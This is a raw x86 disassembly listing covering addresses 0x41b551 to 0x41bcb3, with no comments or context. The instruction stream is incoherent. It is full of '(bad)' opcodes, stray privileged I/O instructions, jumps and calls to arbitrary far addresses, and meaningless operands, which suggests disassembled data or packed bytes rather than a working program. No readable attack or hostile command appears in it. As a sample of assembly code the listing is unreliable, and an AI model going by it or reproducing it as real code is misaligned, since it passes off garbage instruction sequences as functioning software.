  41b551:	cmp    ecx,DWORD PTR [edx-0x4b156019]
  41b557:	daa    
  41b558:	arpl   sp,sp
  41b55a:	mov    WORD PTR [ebx],gs
  41b55c:	loope  0x41b513
  41b55e:	sub    al,0x15
  41b560:	xchg   DWORD PTR [edi-0x3b1c606c],ecx
  41b566:	inc    esp
  41b567:	loop   0x41b599
  41b569:	aam    0x11
  41b56b:	mov    esi,DWORD PTR [eax+ebp*4-0x5fc20399]
  41b572:	pop    esp
  41b573:	inc    ebp
  41b574:	push   eax
  41b575:	push   ecx
  41b576:	jge    0x41b527
  41b578:	push   edi
  41b579:	stos   BYTE PTR es:[edi],al
  41b57a:	xchg   edi,eax
  41b57b:	mov    ds:0x5f9a1b29,eax
  41b580:	mov    dl,0x7
  41b582:	dec    eax
  41b583:	inc    BYTE PTR [esi-0x48]
  41b586:	ss cwde 
  41b588:	outs   dx,BYTE PTR ds:[esi]
  41b589:	mov    al,ds:0xac1abb9c
  41b58e:	pop    eax
  41b58f:	popfw  
  41b591:	dec    BYTE PTR [ecx+0x7d1e932e]
  41b597:	xor    eax,0x16ff593a
  41b59c:	pop    esp
  41b59d:	mov    al,0x82
  41b59f:	sahf   
  41b5a0:	stos   DWORD PTR es:[edi],eax
  41b5a1:	mov    esi,0x661f0512
  41b5a6:	stos   BYTE PTR es:[edi],al
  41b5a7:	outs   dx,DWORD PTR ds:[esi]
  41b5a8:	lods   al,BYTE PTR ds:[esi]
  41b5a9:	jb     0x41b5d5
  41b5ab:	mov    cl,0x60
  41b5ad:	cmp    al,0xec
  41b5af:	jecxz  0x41b555
  41b5b1:	data16 adc BYTE PTR ds:0x6fe281fd,ah
  41b5b8:	jb     0x41b62b
  41b5ba:	shl    DWORD PTR [ebx+0x174fcf6a],0xfe
  41b5c1:	test   DWORD PTR [esi-0x3],eax
  41b5c4:	fisttp WORD PTR [ecx+eiz*2]
  41b5c7:	xchg   esi,eax
  41b5c8:	repnz add al,0x4
  41b5cb:	ins    DWORD PTR es:[edi],dx
  41b5cc:	int3   
  41b5cd:	popa   
  41b5ce:	xchg   BYTE PTR [ebp+ebp*8+0x47],bl
  41b5d2:	sahf   
  41b5d3:	or     BYTE PTR [eax-0x1c5b1b2a],cl
  41b5d9:	push   edi
  41b5da:	sub    bh,dl
  41b5dc:	or     DWORD PTR [edi-0x80],esi
  41b5df:	lods   al,BYTE PTR ds:[esi]
  41b5e0:	gs aaa 
  41b5e2:	add    al,0x96
  41b5e4:	in     eax,0xe6
  41b5e6:	jns    0x41b605
  41b5e8:	xor    dl,0xa2
  41b5eb:	fdivr  QWORD PTR [esi-0x31873c2c]
  41b5f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f2:	push   ebp
  41b5f3:	gs stc 
  41b5f5:	sbb    DWORD PTR [ecx-0x62],ebp
  41b5f8:	cmp    eax,0xd6af2d3b
  41b5fd:	stos   DWORD PTR es:[edi],eax
  41b5fe:	xchg   esi,eax
  41b5ff:	in     eax,0x9e
  41b601:	es dec eax
  41b603:	(bad)  
  41b604:	dec    BYTE PTR [eax+0x14]
  41b607:	add    cl,BYTE PTR [ebp-0x80]
  41b60a:	push   ebp
  41b60b:	add    ah,BYTE PTR [ebp+0x21a63d2a]
  41b611:	push   ebx
  41b612:	icebp  
  41b613:	out    dx,eax
  41b614:	stc    
  41b615:	push   es
  41b616:	or     DWORD PTR ds:0x3ca40417,ebp
  41b61c:	into   
  41b61d:	push   0x3a
  41b61f:	pop    ss
  41b620:	sbb    bl,bh
  41b622:	sahf   
  41b623:	pop    ds
  41b624:	lods   al,BYTE PTR ds:[esi]
  41b625:	jge    0x41b6a5
  41b627:	clc    
  41b628:	daa    
  41b629:	test   eax,0x9a81eaca
  41b62e:	test   BYTE PTR ds:0x6a3a8c17,0x4a
  41b635:	mov    bh,0x59
  41b637:	mov    al,ds:0xd59e9577
  41b63c:	sub    edi,DWORD PTR [esi]
  41b63e:	add    esi,DWORD PTR ds:0xdbbba1c2
  41b644:	jae    0x41b5f3
  41b646:	aam    0x6c
  41b648:	add    BYTE PTR ds:0x6957fbb5,ah
  41b64e:	jg     0x41b65a
  41b650:	mov    ds:0xbfe6c234,eax
  41b655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b656:	inc    cl
  41b658:	cmp    bl,BYTE PTR [edx-0x23ab9c7c]
  41b65e:	rcr    ebx,1
  41b660:	xchg   esi,eax
  41b661:	cwde   
  41b662:	aad    0xcf
  41b664:	mov    edi,0xdaa66636
  41b669:	push   edx
  41b66a:	enter  0x259e,0x75
  41b66e:	add    DWORD PTR [esi],esi
  41b670:	jbe    0x41b6cf
  41b672:	scas   eax,DWORD PTR es:[edi]
  41b673:	inc    eax
  41b674:	xadd   DWORD PTR [eax+eax*4+0x5a],ebp
  41b679:	add    ch,dl
  41b67b:	jns    0x41b66d
  41b67d:	push   DWORD PTR [ebp-0x1]
  41b680:	ds mov bl,0x8e
  41b683:	inc    ecx
  41b684:	repnz push es
  41b686:	add    eax,0x64c95735
  41b68b:	pop    eax
  41b68c:	stos   BYTE PTR es:[edi],al
  41b68d:	in     eax,dx
  41b68e:	dec    esp
  41b68f:	adc    BYTE PTR [esi],cl
  41b691:	cwde   
  41b692:	stc    
  41b693:	ja     0x41b6d5
  41b695:	sbb    ebx,DWORD PTR [ebx+0x3d]
  41b698:	dec    eax
  41b699:	mov    al,0xda
  41b69b:	(bad)  
  41b69c:	mov    bh,0x9a
  41b69e:	repnz leave 
  41b6a0:	loope  0x41b653
  41b6a2:	clc    
  41b6a3:	aad    0xd0
  41b6a5:	jo     0x41b71a
  41b6a7:	jb     0x41b67a
  41b6a9:	shl    DWORD PTR [ecx-0x671a855],1
  41b6af:	not    DWORD PTR [esi]
  41b6b1:	add    eax,esp
  41b6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6b4:	jl     0x41b6ce
  41b6b6:	leave  
  41b6b7:	mov    cl,BYTE PTR [edi]
  41b6b9:	mov    DWORD PTR [edi-0x39],ecx
  41b6bc:	loopne 0x41b643
  41b6be:	add    eax,0x26c6c951
  41b6c3:	mov    ch,0x6c
  41b6c5:	mov    ds:0x9b7eef0b,eax
  41b6ca:	jbe    0x41b704
  41b6cc:	sbb    BYTE PTR [ecx-0x3b81de0],bl
  41b6d2:	pusha  
  41b6d3:	outs   dx,BYTE PTR ds:[esi]
  41b6d4:	add    al,0x3
  41b6d6:	(bad)  
  41b6d7:	mov    cl,0x1f
  41b6d9:	mov    eax,0x98dde93a
  41b6de:	mov    ebp,0xf7124d6
  41b6e3:	or     al,0xf0
  41b6e5:	or     DWORD PTR [ebx],0x7be93bb7
  41b6eb:	and    dl,0xdd
  41b6ee:	mov    bl,0x31
  41b6f0:	sbb    al,0x94
  41b6f2:	test   BYTE PTR [ebp+0x47],al
  41b6f5:	cs enter 0x1b78,0x8
  41b6fa:	jno    0x41b705
  41b6fc:	xchg   esi,eax
  41b6fd:	mov    BYTE PTR [ebp-0x1e],bl
  41b700:	int    0x60
  41b702:	js     0x41b6be
  41b704:	clc    
  41b705:	stc    
  41b706:	ins    BYTE PTR es:[edi],dx
  41b707:	fld    TBYTE PTR [eax]
  41b709:	cmp    ebx,DWORD PTR [edi]
  41b70b:	xchg   ebx,eax
  41b70c:	int    0xc0
  41b70e:	jns    0x41b73e
  41b710:	popf   
  41b711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b712:	idiv   DWORD PTR [eax+0x61bcaab4]
  41b718:	or     al,0x7d
  41b71a:	rol    DWORD PTR [edx+0x1d],1
  41b71d:	imul   ebp,DWORD PTR [edx+0x3637d5cd],0xffffffba
  41b724:	test   DWORD PTR [ecx],ebp
  41b726:	rcr    bl,cl
  41b728:	mov    al,ds:0x4ca11434
  41b72d:	fmulp  st(4),st
  41b72f:	adc    ebp,DWORD PTR ss:[ebx]
  41b732:	cwde   
  41b733:	pop    ebx
  41b734:	bound  edi,QWORD PTR [esi-0x39]
  41b737:	(bad)  
  41b739:	(bad)  
  41b73a:	imul   eax,ecx,0x4f41adb8
  41b740:	pop    ss
  41b741:	rol    DWORD PTR ss:[esi],cl
  41b744:	xchg   edi,eax
  41b745:	test   al,0x8a
  41b747:	hlt    
  41b748:	add    eax,DWORD PTR [edx+0x4]
  41b74b:	in     eax,0xd9
  41b74d:	(bad)
  41b750:	pop    DWORD PTR [eax]
  41b752:	adc    BYTE PTR [edi],0x28
  41b755:	lds    ecx,FWORD PTR [esi+0x6eb16084]
  41b75b:	pop    ss
  41b75c:	add    al,0xec
  41b75e:	mov    DWORD PTR [edx],esp
  41b760:	ds cdq 
  41b762:	or     al,0x5d
  41b764:	test   al,0x11
  41b766:	xchg   WORD PTR [ecx+0x346c21d5],dx
  41b76d:	ins    DWORD PTR es:[edi],dx
  41b76e:	push   0x1f824672
  41b773:	push   ss
  41b774:	pushf  
  41b775:	adc    BYTE PTR [ebp+0x6f],ch
  41b778:	sub    DWORD PTR [edi+0x73],ecx
  41b77b:	mov    edx,0x366265d6
  41b780:	xchg   edi,eax
  41b781:	push   edi
  41b782:	dec    esi
  41b783:	fild   DWORD PTR [edi-0x64730683]
  41b789:	mov    eax,DWORD PTR [edi+0x2e632c6e]
  41b78f:	fdiv   DWORD PTR [esi-0x5c58c51f]
  41b795:	neg    DWORD PTR [eax+edi*4-0x30da0316]
  41b79c:	dec    esp
  41b79d:	adc    al,0x1
  41b79f:	dec    ecx
  41b7a0:	loopne 0x41b72a
  41b7a2:	xchg   BYTE PTR [ebp-0x46],ah
  41b7a5:	mov    BYTE PTR [ecx+0x74],ch
  41b7a8:	mov    cl,0xe7
  41b7aa:	pop    ecx
  41b7ab:	je     0x41b790
  41b7ad:	arpl   WORD PTR [edx+edi*8-0x7f],si
  41b7b1:	fcom   st(2)
  41b7b3:	movntq (bad),mm4
  41b7b4:	out    0xe2,eax
  41b7b6:	fcom   DWORD PTR [edx]
  41b7b8:	cmp    BYTE PTR [esi+0xd],0x6c
  41b7bc:	fbstp  TBYTE PTR [ebp+esi*2-0x6004c958]
  41b7c3:	push   0x19fdea9b
  41b7c8:	gs cs xor eax,0xafb734f0
  41b7cf:	loopne 0x41b82c
  41b7d1:	ins    DWORD PTR es:[edi],dx
  41b7d2:	call   0x412ddcb1
  41b7d7:	out    0x3a,al
  41b7d9:	cmc    
  41b7da:	pop    ds
  41b7db:	sub    dh,BYTE PTR [ecx+0x1ac563e]
  41b7e1:	rcr    bh,0xc
  41b7e4:	add    BYTE PTR [edx],ah
  41b7e6:	add    al,0xa
  41b7e8:	retf   0xc935
  41b7eb:	adc    BYTE PTR [edx+0x70],dh
  41b7ee:	xchg   esp,eax
  41b7ef:	pusha  
  41b7f0:	pop    ebx
  41b7f1:	adc    BYTE PTR [edx+0x4e],ah
  41b7f4:	out    0x26,al
  41b7f6:	dec    ecx
  41b7f7:	test   DWORD PTR [ecx+eax*1-0x29],ecx
  41b7fb:	fidivr WORD PTR [edi]
  41b7fd:	mov    ecx,es
  41b7ff:	jne    0x41b83d
  41b801:	into   
  41b802:	xchg   esp,eax
  41b803:	push   0x12
  41b805:	and    edx,DWORD PTR ds:0xc80b5a57
  41b80b:	fdiv   DWORD PTR [ebx-0x60]
  41b80e:	test   ecx,edi
  41b810:	aas    
  41b811:	push   eax
  41b812:	mov    ebp,0xaa8ef7e4
  41b817:	fld    QWORD PTR [esi+0x690a9f45]
  41b81d:	retf   0x3201
  41b820:	mov    bl,BYTE PTR [edx+0x1]
  41b823:	pop    ecx
  41b824:	and    al,0xdb
  41b826:	mov    WORD PTR [edi+0x5cdfd552],ds
  41b82c:	pusha  
  41b82d:	jo     0x41b7f2
  41b82f:	or     al,0x57
  41b831:	xor    BYTE PTR [ecx+0x20b325f5],0x34
  41b838:	ror    bh,0x35
  41b83b:	or     al,0x84
  41b83d:	push   cs
  41b83e:	cmp    BYTE PTR [ecx],dl
  41b840:	inc    ecx
  41b841:	add    al,BYTE PTR [eax+0x21cb77a1]
  41b847:	lds    edx,FWORD PTR [eax+0x78]
  41b84a:	div    DWORD PTR [edx+0x666e263a]
  41b850:	aad    0x97
  41b852:	aam    0x7c
  41b854:	xor    bh,bh
  41b856:	inc    esi
  41b857:	fld    TBYTE PTR [ebp-0x29]
  41b85a:	mov    bh,0x2a
  41b85c:	pop    es
  41b85d:	popa   
  41b85e:	test   DWORD PTR [ebp-0x18e7c024],esi
  41b864:	in     al,0x6f
  41b866:	mov    DWORD PTR [eax+0x47],esi
  41b869:	xlat   BYTE PTR ds:[ebx]
  41b86a:	jns    0x41b86e
  41b86c:	jmp    0x41b879
  41b86e:	push   edi
  41b86f:	rcl    DWORD PTR [esi+esi*8],cl
  41b872:	enter  0xfcf8,0x3b
  41b876:	dec    ebx
  41b877:	jle    0x41b88f
  41b879:	sbb    ch,ah
  41b87b:	and    eax,0xd2c5ecca
  41b880:	xor    esp,DWORD PTR [eax]
  41b882:	pop    edi
  41b883:	(bad)  
  41b884:	pop    ds
  41b885:	and    esp,DWORD PTR [edx-0x49be4584]
  41b88b:	push   cs
  41b88c:	leave  
  41b88d:	rcl    DWORD PTR [ecx-0x4eefbdc],0x8d
  41b894:	xchg   esi,eax
  41b895:	and    dl,dh
  41b897:	mov    dh,0xfe
  41b899:	sti    
  41b89a:	pusha  
  41b89b:	mov    al,0x3f
  41b89d:	mov    al,ds:0x2acda61e
  41b8a2:	ret    
  41b8a3:	sahf   
  41b8a4:	cdq    
  41b8a5:	ret    
  41b8a6:	shr    BYTE PTR [ecx],1
  41b8a8:	adc    al,0x82
  41b8aa:	add    DWORD PTR [edi],ecx
  41b8ac:	mov    BYTE PTR [ebx],cl
  41b8ae:	and    edx,edx
  41b8b0:	bound  eax,QWORD PTR [esi-0xb93efc]
  41b8b6:	popa   
  41b8b7:	nop
  41b8b8:	ja     0x41b937
  41b8ba:	in     al,dx
  41b8bb:	jae    0x41b915
  41b8bd:	retf   
  41b8be:	imul   ecx,ebx,0xa
  41b8c1:	rol    DWORD PTR [ebx],cl
  41b8c3:	cmp    al,0xe6
  41b8c5:	mov    gs,ecx
  41b8c7:	and    DWORD PTR [esi],edx
  41b8c9:	(bad)  
  41b8ca:	cwde   
  41b8cb:	fs pop ss
  41b8cd:	jne    0x41b8b9
  41b8cf:	jnp    0x41b93f
  41b8d1:	pop    edx
  41b8d2:	pop    es
  41b8d3:	jl     0x41b8e6
  41b8d5:	jle    0x41b8c6
  41b8d7:	xor    bh,BYTE PTR ds:0xdddf9dbf
  41b8dd:	xor    BYTE PTR [ebx],bh
  41b8df:	xchg   DWORD PTR [esp+ebp*4+0x42],ebx
  41b8e3:	int    0x70
  41b8e5:	pop    ds
  41b8e6:	xchg   ebx,eax
  41b8e7:	aad    0xb7
  41b8e9:	jg     0x41b938
  41b8eb:	cmp    BYTE PTR [eax],cl
  41b8ed:	push   ebp
  41b8ee:	pop    ds
  41b8ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f0:	repz sub dl,bh
  41b8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8f4:	imul   ebp,ecx,0x337165fd
  41b8fa:	repnz sbb ch,dh
  41b8fd:	(bad)  
  41b8fe:	pop    ecx
  41b8ff:	fisttp QWORD PTR [edx-0x27]
  41b902:	cmp    esi,DWORD PTR [ebx+edi*8-0x6b]
  41b906:	pop    ds
  41b907:	mov    eax,0x2469575f
  41b90c:	mov    bl,0xb8
  41b90e:	push   0x737aaff2
  41b913:	mov    esp,0x749c9ae2
  41b918:	stos   DWORD PTR es:[edi],eax
  41b919:	sbb    bh,BYTE PTR [eax+0x9]
  41b91c:	das    
  41b91d:	xor    DWORD PTR [ecx],ecx
  41b91f:	push   ss
  41b920:	stos   BYTE PTR es:[edi],al
  41b921:	mov    ?,WORD PTR [ebx+0x46]
  41b924:	not    DWORD PTR [esi-0x29884917]
  41b92a:	xor    DWORD PTR [edi],edi
  41b92c:	addr16 push es
  41b92e:	mov    edx,ss
  41b930:	mov    DWORD PTR [esi+0x35],ebx
  41b933:	(bad)  [esi-0x6deea7f4]
  41b939:	shl    DWORD PTR ds:0xdbbdfa9e,1
  41b93f:	iret   
  41b940:	repnz mov esi,0xbc8b727e
  41b946:	shl    DWORD PTR [eax],1
  41b948:	mov    ebx,0x1eaac9f6
  41b94d:	pop    edx
  41b94e:	data16 gs add al,0x56
  41b952:	push   0xffffff97
  41b954:	xchg   ecx,eax
  41b955:	inc    eax
  41b956:	aas    
  41b957:	out    dx,al
  41b958:	push   ss
  41b959:	cmp    cl,dh
  41b95b:	adc    al,0x1e
  41b95d:	sbb    al,0xd2
  41b95f:	dec    esp
  41b960:	jns    0x41b908
  41b962:	mov    ch,0x21
  41b964:	fldcw  WORD PTR [edi+0x7a]
  41b967:	pop    edi
  41b968:	push   esp
  41b969:	test   DWORD PTR [ecx],ebx
  41b96b:	rol    DWORD PTR [edx-0x2d09a1ea],0x43
  41b972:	aam    0xad
  41b974:	mov    edx,ds
  41b976:	mov    esp,0xad49713a
  41b97b:	ins    DWORD PTR es:[edi],dx
  41b97c:	ja     0x41b93c
  41b97e:	ss xchg ebp,eax
  41b980:	mov    ebp,0xa78fd74f
  41b985:	clc    
  41b986:	adc    DWORD PTR [eax+esi*2+0x73bd24a6],ebx
  41b98d:	xchg   edi,eax
  41b98e:	push   ds
  41b98f:	mov    dh,0x32
  41b991:	and    DWORD PTR [esi-0x65],esp
  41b994:	mov    bh,BYTE PTR [edx+0x3a]
  41b997:	inc    ebx
  41b998:	dec    edx
  41b999:	imul   ecx,DWORD PTR [ebx-0x5d0e231e],0xfffffff8
  41b9a0:	sub    DWORD PTR [edi+edx*2-0x66],esi
  41b9a4:	in     al,0x5a
  41b9a6:	push   eax
  41b9a7:	mov    ch,0x79
  41b9a9:	ficom  WORD PTR [ecx]
  41b9ab:	mov    bl,0x63
  41b9ad:	push   0xffffff83
  41b9af:	mov    ah,0x77
  41b9b1:	les    esi,FWORD PTR [edi]
  41b9b3:	pop    edx
  41b9b4:	popa   
  41b9b5:	jp     0x41ba19
  41b9b7:	ja     0x41b9aa
  41b9b9:	cmp    DWORD PTR [ecx-0x7a],ebp
  41b9bc:	retf   0xc2ef
  41b9bf:	dec    eax
  41b9c0:	xor    eax,0x18fbee35
  41b9c5:	push   edx
  41b9c6:	xchg   BYTE PTR [edi],bh
  41b9c8:	adc    al,BYTE PTR [ecx]
  41b9ca:	aaa    
  41b9cb:	cmp    eax,0xc9f6292d
  41b9d0:	sub    al,0x9c
  41b9d2:	cmp    al,0x56
  41b9d4:	imul   eax,edx,0xf5811f78
  41b9da:	sti    
  41b9db:	popf   
  41b9dc:	pop    ebx
  41b9dd:	(bad)  {k3}{z}
  41b9e2:	xchg   BYTE PTR [esi-0x3b],bh
  41b9e5:	or     al,0xb9
  41b9e7:	mov    ds:0xdf5c5df7,eax
  41b9ec:	mov    bh,0x4b
  41b9ee:	push   edi
  41b9ef:	dec    edx
  41b9f0:	mov    ebp,0x2403c373
  41b9f5:	les    eax,FWORD PTR [ecx-0x6b892f1d]
  41b9fb:	stos   DWORD PTR es:[edi],eax
  41b9fc:	data16 hlt 
  41b9fe:	dec    eax
  41b9ff:	pop    eax
  41ba00:	jne    0x41b9ca
  41ba02:	adc    WORD PTR [eax-0xc],bp
  41ba06:	sahf   
  41ba07:	mov    BYTE PTR [ebx],bh
  41ba09:	dec    ecx
  41ba0a:	mov    es,edi
  41ba0c:	call   0x3016:0x12e8042b
  41ba13:	cmp    eax,0xc0c54889
  41ba18:	popa   
  41ba19:	pusha  
  41ba1a:	call   0x5a62cc81
  41ba1f:	cdq    
  41ba20:	push   ds
  41ba21:	js     0x41ba64
  41ba23:	stos   BYTE PTR es:[edi],al
  41ba24:	cld    
  41ba25:	ins    BYTE PTR es:[edi],dx
  41ba26:	stos   BYTE PTR es:[edi],al
  41ba27:	jb     0x41b9af
  41ba29:	daa    
  41ba2a:	xchg   cx,ax
  41ba2c:	jno    0x41ba05
  41ba2e:	push   ecx
  41ba2f:	sar    BYTE PTR [ecx-0x4a],0x3
  41ba33:	jns    0x41ba6a
  41ba35:	sub    eax,0x5556a7b6
  41ba3a:	cmp    eax,0x3c7d6202
  41ba3f:	int    0xec
  41ba41:	and    eax,0xdbfe6af4
  41ba46:	mov    esp,0x22674429
  41ba4b:	addr16 dec edx
  41ba4d:	adc    ebx,DWORD PTR [ecx-0xe1296ff]
  41ba53:	in     al,dx
  41ba54:	mov    edi,0x5d80c20e
  41ba59:	push   es
  41ba5a:	sti    
  41ba5b:	jmp    0x7a72:0xe4a94b7f
  41ba62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba63:	ret    0xbb4b
  41ba66:	cmp    BYTE PTR [esi],al
  41ba68:	imul   edi,DWORD PTR [edx-0x35319942],0x9bd59008
  41ba72:	test   dh,ah
  41ba74:	(bad)  
  41ba75:	test   al,0x2c
  41ba77:	xchg   esi,eax
  41ba78:	and    dl,BYTE PTR [edx]
  41ba7a:	lods   eax,DWORD PTR ds:[esi]
  41ba7b:	mov    ebp,0xdc48ee1c
  41ba80:	cmp    BYTE PTR [edi-0x3a30199b],dh
  41ba86:	mov    bh,0xa0
  41ba88:	(bad)  
  41ba89:	in     al,dx
  41ba8a:	int    0x5a
  41ba8c:	es ret 
  41ba8e:	xor    al,BYTE PTR [eax+0x3b8de98]
  41ba94:	scas   eax,DWORD PTR es:[edi]
  41ba95:	or     ch,dl
  41ba97:	mov    gs,WORD PTR [edx-0x22c43929]
  41ba9d:	lods   al,BYTE PTR ds:[esi]
  41ba9e:	dec    ecx
  41ba9f:	push   ecx
  41baa0:	pop    ebp
  41baa1:	cld    
  41baa2:	inc    edx
  41baa3:	mov    ds:0x6aa15838,eax
  41baa8:	(bad)
  41baad:	and    BYTE PTR [ebx-0x45],dl
  41bab0:	cld    
  41bab1:	pop    esp
  41bab2:	push   ebp
  41bab3:	aam    0xcb
  41bab5:	dec    esp
  41bab6:	ficomp WORD PTR [esi-0x68e5bb37]
  41babc:	mov    ds:0x3d4508f,al
  41bac1:	(bad)  
  41bac2:	iret   
  41bac3:	mov    ch,0xe1
  41bac5:	sar    bl,1
  41bac7:	fwait
  41bac8:	xlat   BYTE PTR ds:[ebx]
  41bac9:	test   DWORD PTR [esi],eax
  41bacb:	clc    
  41bacc:	frstor [eax-0x3b70f8c5]
  41bad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bad3:	gs mov bl,0x15
  41bad6:	jmp    0x1ed29a9f
  41badb:	or     DWORD PTR [eax+0x79c6cf22],edi
  41bae1:	mov    edx,0x30ee0c89
  41bae6:	out    dx,eax
  41bae7:	enter  0x269e,0xfd
  41baeb:	sbb    DWORD PTR [eax-0x72],edi
  41baee:	pop    ebx
  41baef:	push   esp
  41baf0:	pusha  
  41baf1:	jp     0x41bb05
  41baf3:	sub    dl,BYTE PTR ds:0x4f3da353
  41baf9:	loope  0x41bb10
  41bafb:	iret   
  41bafc:	out    dx,eax
  41bafd:	pop    esi
  41bafe:	jbe    0x41bb51
  41bb00:	fimul  DWORD PTR [eax]
  41bb02:	(bad)  
  41bb04:	sub    ecx,DWORD PTR [edx+0x2e0d7426]
  41bb0a:	in     al,0x62
  41bb0c:	inc    edi
  41bb0d:	leave  
  41bb0e:	mov    edx,DWORD PTR [ecx]
  41bb10:	lods   eax,DWORD PTR ds:[esi]
  41bb11:	push   eax
  41bb12:	sbb    eax,0x30fdd99d
  41bb17:	test   DWORD PTR [ebp+0x58],esp
  41bb1a:	mov    dh,0x92
  41bb1c:	mov    eax,0x4e993a71
  41bb21:	or     al,0x8c
  41bb23:	stos   BYTE PTR es:[edi],al
  41bb24:	and    eax,ebp
  41bb26:	jnp    0x41bb12
  41bb28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb29:	sbb    al,0xfc
  41bb2b:	xchg   edi,eax
  41bb2c:	retf   
  41bb2d:	dec    edi
  41bb2e:	bswap  ebx
  41bb30:	fsqrt  
  41bb32:	jne    0x41bad0
  41bb34:	cmp    ah,BYTE PTR [edx-0x7ed3d04e]
  41bb3a:	idiv   DWORD PTR [edi-0x3c2cdc0c]
  41bb40:	mov    al,ds:0x8ffd9845
  41bb45:	into   
  41bb46:	out    0x6e,eax
  41bb48:	push   cs
  41bb49:	sub    BYTE PTR [ecx+ebx*8-0x5],al
  41bb4d:	mov    ebp,ebp
  41bb4f:	les    ecx,FWORD PTR [esi]
  41bb51:	fwait
  41bb52:	in     al,dx
  41bb53:	fnstenv [ebx+0x564e8f21]
  41bb59:	in     al,dx
  41bb5a:	cld    
  41bb5b:	pop    es
  41bb5c:	adc    esi,esp
  41bb5e:	mov    ah,0x1
  41bb60:	or     BYTE PTR [eax+0x4f],bh
  41bb63:	add    dl,cl
  41bb65:	jbe    0x41bb11
  41bb67:	arpl   WORD PTR [edx+0x2a],si
  41bb6a:	push   es
  41bb6b:	inc    edx
  41bb6c:	fbld   TBYTE PTR [eax]
  41bb6e:	jne    0x41bbcc
  41bb70:	mov    edx,?
  41bb72:	in     eax,0x44
  41bb74:	xor    dl,BYTE PTR [ebp+0x176eac9]
  41bb7a:	xor    bl,BYTE PTR [eax]
  41bb7c:	inc    edx
  41bb7d:	inc    ebp
  41bb7e:	call   0x5adc0eca
  41bb83:	enter  0x16f7,0x99
  41bb87:	sbb    eax,0x9361f59
  41bb8c:	mov    eax,ds:0x72d00a94
  41bb91:	sbb    DWORD PTR [ebp+0x29],ebx
  41bb94:	fwait
  41bb95:	jns    0x41bbb4
  41bb97:	xchg   esp,eax
  41bb98:	icebp  
  41bb99:	les    eax,FWORD PTR fs:[edx+0x5b0f0a1]
  41bba0:	xchg   edi,esp
  41bba2:	push   edi
  41bba3:	cmp    esp,DWORD PTR [ebx-0x4d79fa0d]
  41bba9:	cld    
  41bbaa:	fild   QWORD PTR fs:[ebx+0x16995085]
  41bbb1:	clc    
  41bbb2:	xor    BYTE PTR [bx],0x47
  41bbb6:	hlt    
  41bbb7:	imul   edx,DWORD PTR [eax-0x58ad841b],0xffffffbd
  41bbbe:	jge    0x41bba7
  41bbc0:	test   dl,al
  41bbc2:	mov    esp,0x13173f82
  41bbc7:	push   ss
  41bbc8:	jle    0x41bbb0
  41bbca:	inc    edx
  41bbcb:	xchg   esi,eax
  41bbcc:	rcl    DWORD PTR [ecx+0x79f47173],1
  41bbd2:	mov    ebx,0xd96b5e39
  41bbd7:	lea    esi,[edx-0x2aa469b1]
  41bbdd:	dec    esi
  41bbde:	xchg   cl,ch
  41bbe0:	test   eax,0x75c5efb0
  41bbe5:	(bad)  
  41bbe6:	fcmovnbe st,st(6)
  41bbe8:	add    cl,BYTE PTR cs:[esi+edx*4+0x5ac90daf]
  41bbf0:	mov    edx,0x561d0bd7
  41bbf5:	pop    esi
  41bbf6:	inc    edi
  41bbf7:	clc    
  41bbf8:	mov    ds:0xe09dca8b,eax
  41bbfd:	mov    esp,DWORD PTR [si+0x13ae]
  41bc02:	scas   al,BYTE PTR es:[edi]
  41bc03:	in     eax,dx
  41bc04:	in     al,dx
  41bc05:	pop    edi
  41bc06:	pop    ebx
  41bc07:	cmp    eax,DWORD PTR [edx+ecx*8+0x7c56b137]
  41bc0e:	push   edx
  41bc0f:	mov    ds,ecx
  41bc11:	mov    dl,0xa6
  41bc13:	ret    0x9d88
  41bc16:	mov    eax,0x615ccb6e
  41bc1b:	mov    BYTE PTR [esi-0x5],dl
  41bc1e:	retf   0x36cd
  41bc21:	mov    DWORD PTR [esi],0x100a0b6a
  41bc27:	shl    BYTE PTR [ecx+0x229f9e1a],cl
  41bc2d:	xchg   ecx,eax
  41bc2e:	shl    BYTE PTR [eax+0x427e15da],cl
  41bc34:	sbb    al,0xe
  41bc36:	adc    BYTE PTR [ecx-0x53],bl
  41bc39:	jmp    0x7c19aae5
  41bc3e:	loope  0x41bc24
  41bc40:	and    dh,bh
  41bc42:	ins    BYTE PTR es:[edi],dx
  41bc43:	adc    dh,BYTE PTR [esi+esi*1+0x29]
  41bc47:	ins    BYTE PTR es:[edi],dx
  41bc48:	out    0xaa,eax
  41bc4a:	or     BYTE PTR [ecx+0x6d9a64a9],0x3c
  41bc51:	in     al,dx
  41bc52:	lods   eax,DWORD PTR ds:[esi]
  41bc53:	(bad)  [eax+0x67]
  41bc56:	mov    ebx,0x717eec6
  41bc5b:	xchg   edi,eax
  41bc5c:	out    0x5a,al
  41bc5e:	aas    
  41bc5f:	xchg   ebp,eax
  41bc60:	mov    ecx,0x8c246d95
  41bc65:	mov    dh,0xbd
  41bc67:	stc    
  41bc68:	xchg   edx,eax
  41bc69:	pop    ebp
  41bc6a:	pop    edx
  41bc6c:	lods   eax,DWORD PTR ds:[esi]
  41bc6d:	fbld   TBYTE PTR [edx+0x1a]
  41bc70:	mov    ebx,0x256632bc
  41bc75:	(bad)  
  41bc76:	push   ebx
  41bc77:	push   edx
  41bc78:	call   0x7621bb2
  41bc7d:	imul   ebx,DWORD PTR [ecx-0xc568497],0xba68129a
  41bc87:	cmp    esi,DWORD PTR [edi-0x73c38d91]
  41bc8d:	fs repz cmp bh,0xec
  41bc92:	mov    edx,0x3723ec24
  41bc97:	jl     0x41bcbb
  41bc99:	(bad)  
  41bc9a:	cmc    
  41bc9b:	ret    
  41bc9c:	fdiv   st(2),st
  41bc9e:	jns    0x41bc35
  41bca0:	xchg   BYTE PTR [edi-0x4cebbc4a],bh
  41bca6:	dec    ebp
  41bca7:	loope  0x41bc6b
  41bca9:	xor    al,BYTE PTR [ebp+0x1fa8cef8]
  41bcaf:	mov    eax,ds
  41bcb1:	xchg   ebx,eax
  41bcb2:	xchg   esi,eax
  41bcb3:	pop    esp
